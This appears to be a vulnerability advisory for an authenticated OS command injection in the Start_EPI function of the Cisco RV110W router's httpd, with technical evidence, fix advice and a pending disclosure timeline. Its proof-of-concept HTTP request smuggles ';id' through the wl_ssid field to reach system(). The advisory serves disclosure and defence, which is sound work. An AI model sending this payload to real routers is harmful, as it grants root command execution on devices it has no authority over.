# Cisco RV110W Start_EPI OS Command Injection via wl_ssid

## Basic Information

| Field | Value |
|-------|-------|
| **VulnDB ID** | (Pending Assignment) |
| **CVE ID** | (Pending Assignment) |
| **CWE** | CWE-78 |
| **CVSS 3.1** | 8.8 (High) |
| **CVSS Vector** | CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H |
| **Type** | OS Command Injection |
| **Internal ID** | FRV-CISCO-RV110W-002 |

## Affected Product

| Field | Value |
|-------|-------|
| **Vendor** | Cisco Systems |
| **Product** | RV110W Wireless-N VPN Firewall |
| **Version** | Firmware <= 1.2.1.7 (EOL) |
| **Binary** | /usr/sbin/httpd |
| **Architecture** | MIPS32 Little-Endian |
| **Function** | Start_EPI @ 0x46a838 |

## Description

An OS command injection vulnerability exists in the Start_EPI function (0x46a838) of httpd in Cisco RV110W firmware <= 1.2.1.7. The function reads the wl_ssid parameter via get_cgi(), formats it into 'wl join <wl_ssid>' via sprintf(), and passes it to system() without sanitization.

## Proof of Concept

```http
POST /apply.cgi HTTP/1.1
Host: 192.168.1.1
Content-Type: application/x-www-form-urlencoded
Cookie: <valid_session>

submit_button=EPI&change_action=gozila_cgi&submit_type=Start_EPI&wl_ssid=;id&wl_ant=0&wl_rate=auto&ttcp_num=1&ttcp_ip=192.168.1.1&ttcp_size=1500
```

## Technical Evidence

- **Source**: get_cgi() @ 0x41a534 — reads wl_ssid + 5 other params
- **Sink**: system() @ PLT 0x500310
- **Call chain**: get_cgi → sprintf('wl join %s') → system
- **Verification**: Unicorn Fuzzer CONFIRMED at iteration 0 — payload '; id' reached system()
- **Crash evidence**: 1 crash, path 25 blocks

## Impact

Authenticated attacker can execute arbitrary OS commands as root via crafted SSID value.

## Fix Recommendation

Replace system() with execve(). Validate wl_ssid against SSID character allowlist. Filter shell metacharacters.

## Discovery

| Field | Value |
|-------|-------|
| **Method** | FirmRec Cross-Firmware Genetic Vulnerability Mining |
| **Date** | 2026-03-22 |
| **Discoverer** | ST4R |
| **Verification** | Unicorn Fuzzer CONFIRMED (iter 0, 1 crash) + angr (30 steps) |
| **Status** | CONFIRMED |

## Disclosure Timeline

| Date | Event |
|------|-------|
| 2026-03-22 | Vulnerability discovered via FirmRec automated pipeline |
| TBD | Vendor notification |
| TBD | CVE ID assigned |
| TBD | Public disclosure (+90 days) |

---
*Discovered via FirmRec — IoT Firmware Genetic Vulnerability Mining Framework*
